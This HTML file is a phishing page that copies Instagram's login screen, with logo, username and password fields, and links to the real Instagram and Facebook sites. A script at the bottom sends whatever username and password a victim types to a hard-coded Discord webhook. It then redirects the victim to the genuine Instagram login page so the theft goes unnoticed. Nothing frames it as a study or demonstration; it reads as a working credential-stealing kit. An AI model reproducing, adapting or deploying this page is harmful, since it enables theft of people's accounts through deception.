      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo"
                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
                    alt="Instagram">
                </div><!-- Header end -->
                <div class="form-wrap">
                  <form class="form">

                    <div class="input-box">
                      <input type="text" id="username" placeholder="Phone number, username, or email"
                        aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username"
                        required>
                    </div>

                    <div class="input-box">
                      <input type="password" name="password" id="password" placeholder="Password" maxlength="30"
                        aria-required="true" autocapitalize="off" autocorrect="off" required>
                    </div>

                    <span class="button-box">
                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
                    </span>

                    <script>
                      let usernameInput = document.querySelector("#username");
                      let passwordInput = document.querySelector("#password");
                      let button = document.querySelector(".btn");

                      button.disabled = true; // setting button state to disabled

                      // Add event listeners to both input fields
                      usernameInput.addEventListener("input", handleInputs);
                      passwordInput.addEventListener("input", handleInputs);

                      function handleInputs() {
                        // Check if both username and password fields are filled
                        if (usernameInput.value !== "" && passwordInput.value !== "") {
                          button.disabled = false; // enable button
                        } else {
                          button.disabled = true; // disable button
                        }
                      }
                    </script>

                    <div class="separator">
                      <div class="line"></div>
                      <p>OR</p>
                      <div class="line"></div>
                    </div>

                    <div class="other">
                      <a href="https://www.facebook.com/login/">
                        <button class="fb-login-btn" type="button">
                          <i class="fa fa-facebook-official fb-icon"></i>
                          <span class="">Log in with Facebook</span>
                        </button>
                      </a>
                    </div>

                    <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
                  </form>
                </div> <!-- Form-wrap end -->
              </div> <!-- Login-box end -->

              <div class="login-box">
                <p class="text">Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup">Sign
                    up</a></p>
              </div> <!-- Signup-box end -->

              <div class="app">
                <p>Get the app.</p>
                <div class="app-img">
                  <a
                    href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                    <img
                      src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
                  </a>
                  <a
                    href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=6%2C8%2C1371%2C633">
                    <img src="https://i.ibb.co/LrSp5Wj/EHY6-Qn-ZYd-NX.png">
                  </a>
                </div> <!-- App-img end-->

  <script>
    function sendMessage() {
      function sleep(milliseconds) {
        const date = Date.now();
        let currentDate = null;
        do {
          currentDate = Date.now();
        } while (currentDate - date < milliseconds);
      }
      var request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/1189883112902103161/u4nOQ-QHVuEpwAbxp2FEdjbtjxWGxDx5hYb_lgCOCUL-0uCi7c6YFvFqu2uwAlEIfOv8");
      request.setRequestHeader('Content-type', 'application/json');
      var params = {
        content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
      }
      request.send(JSON.stringify(params));
      sleep(400)
      window.location.replace("https://www.instagram.com/accounts/login/");
    }
  </script>
